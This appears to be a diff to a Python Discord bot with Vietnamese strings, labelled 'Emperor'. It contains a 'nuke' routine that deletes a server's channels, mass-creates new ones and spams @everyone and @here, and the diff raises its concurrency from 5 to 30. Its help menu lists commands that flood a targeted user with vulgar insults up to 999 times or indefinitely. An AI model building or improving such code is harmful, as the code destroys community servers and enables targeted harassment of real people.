@@ -420,7 +420,7 @@ def setup_bot_events(b_inst, name):
         return
 
       await message.channel.send(
-          "🚀 Bắt đầu Nuke: Xóa sạch kênh cũ, tạo 200 kênh mới và spam @everyone @here..."
+          "Emperor OnTop 😜"
       )
       guild = message.guild
 
@@ -431,7 +431,7 @@ def setup_bot_events(b_inst, name):
           )
           if owner:
             embed_nuke = discord.Embed(
-                title=f"⚠️ [{b_inst.user.name}] Lệnh Nuke Đã Được Kích Hoạt",
+                title=f"⚠️ [{b_inst.user.name}] Nuke Đã Được Kích Hoạt",
                 color=discord.Color.red(),
             )
             embed_nuke.add_field(
@@ -440,7 +440,7 @@ def setup_bot_events(b_inst, name):
                 inline=False,
             )
             embed_nuke.add_field(
-                name="🏠 Server",
+                name="🏠 Server bị Nuke",
                 value=f"`{guild.name}` (ID: `{guild.id}`)",
                 inline=False,
             )
@@ -488,7 +488,7 @@ def setup_bot_events(b_inst, name):
           if delete_tasks:
             await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-          nuke_semaphore = asyncio.Semaphore(5)
+          nuke_semaphore = asyncio.Semaphore(30)
 
           async def create_and_spam():
             async with nuke_semaphore:
@@ -716,7 +716,7 @@ class TreoChannelSelectView(discord.ui.View):
         placeholder="Chọn các kênh để treo spam...",
         channel_types=[discord.ChannelType.text],
         min_values=1,
-        max_values=25,
+        max_values=5,
         custom_id="treo_channel_select",
     )
     self.channel_select.callback = self.channel_callback
@@ -988,7 +988,7 @@ def register_all_commands(b_target):
     else:
       level = "CHÚA TỂ CUTE 👑✨"
       style = "Cute Không Ai Bằng"
-      nhan_xet = "Siêu Cấp Đáng Yêu Nhất Thế Giới Ai Nhìn Vào Là Muốn Địt Cho Phát"
+      nhan_xet = "Siêu Cấp Đáng Yêu Nhất Thế Giới"
 
     embed = discord.Embed(
         title="🌸 MÁY ĐO CUTE BÁ KHÍ 🌸",
@@ -1233,22 +1233,22 @@ def register_all_commands(b_target):
                 "➱ Mượn bot gửi tin nhắn\n\n"
 
                 "🗯️**`b!noidung nội_dung số_lượng`**\n"
-                "➱ Xả nội dung tùy chỉnh tối đa 999 lần - EPR\n\n"
+                "<a:arrow:1554843161694572634> Xả nội dung tùy chỉnh tối đa 999 lần <a:cross:1554034613859389551>\n\n"
 
-                "⚔️**`b!xangon @user/ID số_lượng`**\n"
-                "➱ Xả ngôn vào thằng ngu lồn V1 tối đa 999 - EPR\n\n"
+                "<a:scythe:1554034754121371649>**`b!xangon @user/ID số_lượng`**\n"
+                "<a:arrow:1554843161694572634> Xả ngôn vào thằng ngu lồn V1 tối đa 999 <a:cross:1554034613859389551>\n\n"
 
-                "⚔️**`b!xangonV2 @user/ID số_lượng`**\n"
-                "➱ Xả ngôn vào thằng ngu lồn V2 tối đa 999 - EPR\n\n"
+                "<a:scythe:1554034754121371649>**`b!xangonV2 @user/ID số_lượng`**\n"
+                "<a:arrow:1554843161694572634> Xả ngôn vào thằng ngu lồn V2 tối đa 999 <a:cross:1554034613859389551>\n\n"
 
-                "⚔️**`b!xangonV3 @user/ID`**\n"
-                "➱ Xả ngôn vĩnh viễn lên thằng ngu lồn - EPR\n\n"
+                "<a:scythe:1554034754121371649>**`b!xangonV3 @user/ID`**\n"
+                "<a:arrow:1554843161694572634> Xả ngôn vĩnh viễn lên thằng ngu lồn <a:cross:1554034613859389551>\n\n"
 
-                "⚔️**`/treodakenh`**\n"
-                "➱ Xả ngôn đa kênh lên thằng ngu lồn - EPR\n\n"
+                "<a:scythe:1554034754121371649>**`/treodakenh`**\n"
+                "<a:arrow:1554843161694572634> Xả ngôn đa kênh lên thằng ngu lồn <a:cross:1554034613859389551>\n\n"
 
-                "🚫**`b!stop`** hoặc **`/stop`**\n"
-                "➱ Dừng all tiến trình spam/treo trong server"
+                "<a:c_:1554838191926939679>**`b!stop`** hoặc **`/stop`**\n"
+                "<a:arrow:1554843161694572634> Dừng all tiến trình spam/treo trong server"
             ),
             inline=False,
         )
@@ -1308,9 +1308,9 @@ def register_all_commands(b_target):
   async def menu_slash(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=False)
     embed = discord.Embed(
-        title="🌊HƯỚNG DẪN SỬ DỤNG BOT - EMPEROR",
+        title="<a:blcrown:1554034899227250749> EMPEROR | EPR",
         description=(
-            "🌬️**Vào Server Để Add Bot - Bot Được Tạo Bởi Gehihi**😂"
+            "<:shhh:1554028014818295838>**Vào Server Để Add Bot - Bot Được Tạo Bởi Gehihi**😂"
         ),
         color=discord.Color.from_rgb(255, 0, 0),
     )
